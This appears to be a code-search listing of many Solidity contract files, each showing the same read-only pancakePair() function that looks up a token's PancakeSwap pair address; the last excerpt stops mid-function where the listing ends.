<source file="systems/source-code/0x9f956D811170c17aEeA2382b44132520D7A63701.sol" startline="46" endline="48" pcid="5744">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0xE9Ce9ff1891e1F38778FCEEFC53350eA3A7370D7.sol" startline="46" endline="48" pcid="8449">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0xfDC34A848cBc058f5D246D22b3d9B96eB7d5a301.sol" startline="47" endline="49" pcid="9272">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0x4197014b377FDf6a877ED930f16982045285EF96.sol" startline="51" endline="53" pcid="2414">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0xBeC25691510e9A714648323DC55bEC5199719d52.sol" startline="666" endline="668" pcid="6820">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0xf0c0E88a174A69AA98fd48716CdED5cd14a1af22.sol" startline="46" endline="48" pcid="8807">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0x50c69EB4BA27356A09110a622Deb2A7B9C58f6c4.sol" startline="46" endline="48" pcid="2986">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0x6a5187F14C2b01BebF7E60A6BCac513D4fc5F144.sol" startline="47" endline="49" pcid="3921">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0xcAE6d8F16193526B9973C93096F0B9B788af999F.sol" startline="51" endline="53" pcid="7229">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0xB34429e7E522e8cDdDC4D4a49E98E073bdfEa29a.sol" startline="78" endline="80" pcid="6555">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0x460dad15a49c2738b3fc8cb5c7dcfa5d530847af.sol" startline="50" endline="52" pcid="2621">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0xef2d4c16063caa3b3202ab447414b7a2aa53ac37.sol" startline="51" endline="53" pcid="8717">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0xfE0A4D6A16F934E3d595DB4b0D893071124CB693.sol" startline="45" endline="47" pcid="9287">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0xE413f21F74faC68bCd2c16626f0FCa30b55692Dd.sol" startline="48" endline="50" pcid="8269">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0x7c947C432A8b47feD452DbE026cc6648ad6a2cC6.sol" startline="50" endline="52" pcid="4655">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0xa71Cbe77C505140Cd10070401b82580E0Fe94a1B.sol" startline="53" endline="55" pcid="6099">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0x3Bc0F912FcCA2528801E55FcA480F54f69a9c886.sol" startline="51" endline="53" pcid="2045">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0xcd8bdb2857ea0948122ccb9b17fc2a6d721b97ae.sol" startline="48" endline="50" pcid="7291">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0x55D55083c478237062763c41CBd20209841a0459.sol" startline="49" endline="51" pcid="3203">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0x515Eab35fB6F9687e0D6cd8B796aEF5E7d15064F.sol" startline="374" endline="376" pcid="3022">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0x17A5c49Cb48bf49cc10D1Ec05fE899Bb447811Fd.sol" startline="48" endline="50" pcid="710">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0x4cb7fa2798f47c0531601d8fc33a2F1062b9B0c9.sol" startline="50" endline="52" pcid="2892">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0x84A1dde0d0Bd23A2F4Cce011585b415ffdFE2582.sol" startline="49" endline="51" pcid="4963">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0x8760079142f48028f4e06656565667d2b66a040f.sol" startline="47" endline="49" pcid="5012">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0x707dAb814AAE29c506EAfc8036b64066FC403444.sol" startline="46" endline="48" pcid="4128">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0x584535e0ce218addde8af49c308F25aAb7033E53.sol" startline="48" endline="50" pcid="3304">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0xa42284f1617bc85bd6c0139f9482b0908ee42915.sol" startline="48" endline="50" pcid="5956">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0x3bcddA8f67A88449e3a6aEA912f860F28DE1A03a.sol" startline="47" endline="49" pcid="2060">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0x6FB11C60e84916968b4c70ca80889BD13fbEDA9b.sol" startline="49" endline="51" pcid="4072">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0xBD13AACef22A780AB305c9478a801Ce8752aa7aB.sol" startline="49" endline="51" pcid="6773">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0xFE485690c31dD2DCbc1919B430d594F3389D6e82.sol" startline="374" endline="376" pcid="9308">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0x6e7C09630F36B5f34459750c9717C4De1AE94165.sol" startline="46" endline="48" pcid="4056">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0xe542Cc82fcd14a249D0Bc3835ef4e3730616b190.sol" startline="52" endline="54" pcid="8284">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0x94B74A3646f87FADa5EAD91F0af0709fD7c5fe1f.sol" startline="46" endline="48" pcid="5383">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0xb3F23B54930Fa83b12A26eD228E431C4A6187590.sol" startline="50" endline="52" pcid="6561">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0xccD47BEeEf5E57708853902581289A950E4E9722.sol" startline="48" endline="50" pcid="7275">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0x19a64f43113e925223a9d76513727044e5160e70.sol" startline="86" endline="88" pcid="792">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0xfEf911f4AbE542804fdDFD538E637c827a2c4295.sol" startline="49" endline="51" pcid="9326">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0x4701BD9e462012bC2A6D9e6aD71a132d7b64dF7d.sol" startline="47" endline="49" pcid="2668">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0xeFA7f35b824bB9A8696DAeA87172c466f6d8D5A2.sol" startline="53" endline="55" pcid="8732">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0x3505c70Dbf2Cc4ECD84Dd0Bed04f8126c26Ab909.sol" startline="53" endline="55" pcid="1662">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0x341F7b39D375195870915b0744c90D3c6459EEdd.sol" startline="47" endline="49" pcid="1606">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0x571d1b19e4eaDC8840499d3A408a4CD3fa31f5A6.sol" startline="44" endline="46" pcid="3268">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0xC44c92c0226cF68852E3dbD8E5020B654781De95.sol" startline="43" endline="45" pcid="7047">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0xa0EeeaeA46e92b35849f6F3afC9C63478A0967A0.sol" startline="49" endline="51" pcid="5778">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0xb5c5017c98549049c1d1Cf46e3d0eA7882a21B33.sol" startline="50" endline="52" pcid="6606">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0xF3E3E0381509e1B6a83f0D8E41b7219777010A51.sol" startline="49" endline="51" pcid="8876">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0x11067Cc96F63B2b375fb740FEee95aA2009A5249.sol" startline="51" endline="53" pcid="443">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0xcfd07da825fbc71855ce35cc5953336b23e27a82.sol" startline="47" endline="49" pcid="7422">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0xca7d2118fbfaac126a51d403c2f73eff4af97a1a.sol" startline="100" endline="102" pcid="7222">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0x50F33884A82D799A14bEF3636523e6E9c761D9DD.sol" startline="48" endline="50" pcid="3001">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0xff5c2d7Ea91Cb2a88e58E840f24088B5b445834A.sol" startline="50" endline="52" pcid="9341">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0x15fD6fad37E54f3B9fFcf3B1c4A817987Bc54EB5.sol" startline="47" endline="49" pcid="659">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0x400ceeaef948d1DfE5fD1F2fa5a431Fb7e11a086.sol" startline="46" endline="48" pcid="2339">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0xc898c687bdb580D7430277a9bcB503547a09E5ff.sol" startline="49" endline="51" pcid="7160">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0xDBc4b8F7D65167C5f44426dbb95Ec8921F629386.sol" startline="47" endline="49" pcid="7784">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0xfbefc1a66fa6c6fe5107942e12fa981e378b1791.sol" startline="46" endline="48" pcid="9187">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0xfFc50B460871D6dF13CA15F24c29cB646B6606f5.sol" startline="50" endline="52" pcid="9356">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0x9C4595f9D874E2853bc5E57bB98Ca764cBa684d0.sol" startline="51" endline="53" pcid="5684">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0x97599936D137EFDD11Eaa2989F58f5a00BCd2803.sol" startline="45" endline="47" pcid="5478">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0xb7844372AB08A7EBA9D3cA79ccDe3F22C990b1E5.sol" startline="50" endline="52" pcid="6665">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0xf54B624da049ec181B06B2335A53d5c963B12d46.sol" startline="46" endline="48" pcid="8986">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0x79868a92715cc6ba1829a46d292992d1c1945e6c.sol" startline="52" endline="54" pcid="4586">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0xa6Bbb91fC7029E259F590195C21C57D26F480835.sol" startline="49" endline="51" pcid="6084">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0x8227de806a54ce72c23fab6f175d80d688536d7a.sol" startline="47" endline="49" pcid="4867">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0x4BAdfe3A6691C6d4842075C861dB965597E4D895.sol" startline="46" endline="48" pcid="2817">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0x5fA90D86c0F1a01F1f4aaB2C1a98e45adC5Ee38f.sol" startline="52" endline="54" pcid="3615">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0x9FF854892a5FE60995844359FA4BB099915888ef.sol" startline="46" endline="48" pcid="5759">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0x033Be8705C262bb2A12da0274297790e9479CCe1.sol" startline="47" endline="49" pcid="135">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0xeC7593A6254CE83FA3545B1F44EcDf6C6b85848b.sol" startline="45" endline="47" pcid="8609">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0x0D6a0b9A0989D9126953C5a4aE4aA5300f6535f1.sol" startline="46" endline="48" pcid="355">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0xd59623cfe3dbe4f63e02e6add0f25d3b532b21ce.sol" startline="50" endline="52" pcid="7631">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0xD1D8c3f9a5609027A1c7cEF070aB9c51b99DCFf7.sol" startline="50" endline="52" pcid="7482">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0x0934865C5546d21B4fD998bd5E1D3a5cD351D961.sol" startline="50" endline="52" pcid="257">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0xCDFcbB5be93d37A33C85ffd7828dDDd332823349.sol" startline="46" endline="48" pcid="7306">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0x47BCDA0202Cf59825388c1Fbc6A03B52dd068121.sol" startline="50" endline="52" pcid="2698">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0x847d2f49E856550F93f7aADF444528a024256372.sol" startline="50" endline="52" pcid="4942">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0x7bb08a75ea1D11298c6A3fF2A638153C96792C93.sol" startline="50" endline="52" pcid="4640">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0x73Ff82219f9b9ba3fEbe8aed26C159378D4e00B2.sol" startline="51" endline="53" pcid="4265">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0x21bcc45a9a9cb57084b6d6409d8fb0717bffeb91.sol" startline="46" endline="48" pcid="1015">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0xAD7052E3511E19a82705E06756cF087A36B68e4a.sol" startline="47" endline="49" pcid="6299">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0x892128b76b80C251F79B8F2E2fa300eE7546831A.sol" startline="47" endline="49" pcid="5087">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0x99E6b2939603Ac9F9daF3f441f1A1A05b6d54c1f.sol" startline="48" endline="50" pcid="5604">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0x99D00D99221a9CFF03d0F48a6674b71A7d0893Fc.sol" startline="42" endline="44" pcid="5586">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0xc1143D26004Ec3253eF0aB4500113105164aA789.sol" startline="53" endline="55" pcid="6920">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0x7639F0fCD891a5c1D72A986258580Bb28c12A94E.sol" startline="50" endline="52" pcid="4397">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0x5ABbDae4e6d7c89640129E87409C8F991CeE5174.sol" startline="50" endline="52" pcid="3436">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0x22E7f1B1300DBd955C689ac4Da292f938A4AEBFA.sol" startline="48" endline="50" pcid="1045">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0x879ef12F70c31BfB91b7Fd74f74C71bb132D8e3a.sol" startline="44" endline="46" pcid="5027">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0x19f9165689d09F3562419fE8b429735284cc37C0.sol" startline="50" endline="52" pcid="814">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0x3c8B8B3D57AE533C8A34A290327024f915335CA9.sol" startline="49" endline="51" pcid="2130">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0x0D33f227b588446F1Bff2b07AE00fF69EB086876.sol" startline="50" endline="52" pcid="340">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0xecF790443697567D67022c757ABE80ac4648dA0E.sol" startline="50" endline="52" pcid="8666">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0xE36B83Ff8Ae143A1Ee1E960968C37c5Bd4DA8438.sol" startline="47" endline="49" pcid="8254">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0x17E0A45a46FC67d20020128E368637dEA3EFC172.sol" startline="51" endline="53" pcid="725">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0xfb43f573a247cbcb8bd9a366d0afb31f4dba1e55.sol" startline="48" endline="50" pcid="9154">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0xeA9E312E409599e3cCd50Ff1A8F9e742D60C463B.sol" startline="49" endline="51" pcid="8527">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0xb628B6198E2320437e8a9FF1e72A9FF3f1636cf9.sol" startline="53" endline="55" pcid="6623">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0xd1f939d7de311a475d3d97f2dadb1943dd1bb555.sol" startline="50" endline="52" pcid="7512">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0x4504921b0d800eca1770f89740b7aaa8f3f57fb9.sol" startline="52" endline="54" pcid="2569">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0x187ecd1d7d930a356469551f7c71742ac2a7948d.sol" startline="49" endline="51" pcid="768">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0x3fb9d6a99375a51fd64641bd6e1fd6dd310b74e4.sol" startline="97" endline="99" pcid="2306">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0xe6306Af140F6eefa1d461Ff04a549D51FF4dd16B.sol" startline="46" endline="48" pcid="8314">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0x8d9579e8591826ef37C80f680e33B6C8c38baB47.sol" startline="48" endline="50" pcid="5181">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0x55C24F7AdB76f73E9d7FEF837FA0538edBd00280.sol" startline="48" endline="50" pcid="3188">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0x1F4275D2806f24d44a0f047C9591141409533f8d.sol" startline="51" endline="53" pcid="985">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0xA2F5f226ab0cC49602dFf5e178AC9bC978869395.sol" startline="46" endline="48" pcid="5859">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0x8f5b2832b8D440cf00B5Ef5a37d12DC9d96F0839.sol" startline="49" endline="51" pcid="5247">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0x5ba66281ec78ee1a83e7a449d1692b0fda7023e2.sol" startline="35" endline="37" pcid="3494">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0x4115454c188acFB9Cb67c6d795214055381b53B5.sol" startline="51" endline="53" pcid="2399">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0x5ad359AaC713929412c9b802175A9f12E5cf9306.sol" startline="47" endline="49" pcid="3451">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0x2bc6B9e1b6AE7EDF9a21298Ba0bfe18a166a41d3.sol" startline="49" endline="51" pcid="1289">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0x545189e64a542b50e06902bceec0f536c662f46d.sol" startline="47" endline="49" pcid="3143">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0x2e45211957ECDd650F0eAA42f6D58F03D58159e0.sol" startline="50" endline="52" pcid="1395">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0x951f6AC91566cC392D051278A1E921ECF56a9B6F.sol" startline="46" endline="48" pcid="5398">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0x92Fb66bAcacDeB0BFf34538D805521F1019dce1a.sol" startline="45" endline="47" pcid="5328">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0x3B06f6027a41bfCED3D5e6855B69aeA5e7426e90.sol" startline="49" endline="51" pcid="2011">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0x408480574c803D05a0244b479c5020a97f546c51.sol" startline="47" endline="49" pcid="2369">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0xDe77F59a385B50d78aeB7C646d9dF1E4fD76f1a4.sol" startline="51" endline="53" pcid="7939">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0x3aE19CA727e6c9C06dA578fB34113aF9aC0676ee.sol" startline="50" endline="52" pcid="1996">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0xB1426cE1931Bc2f72fF5eEcFf831679B1fe52c3b.sol" startline="45" endline="47" pcid="6511">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0x36eDC92606D7cc78F9bf63665eA39Fb5A76b7796.sol" startline="50" endline="52" pcid="1826">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0x99818798AedD80Fef824086eF10411C89009e174.sol" startline="48" endline="50" pcid="5570">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0x39Ac510d21f06A31e1bf897138E441661f1942a8.sol" startline="48" endline="50" pcid="1924">
    function pancakePair() public view virtual returns (address) {
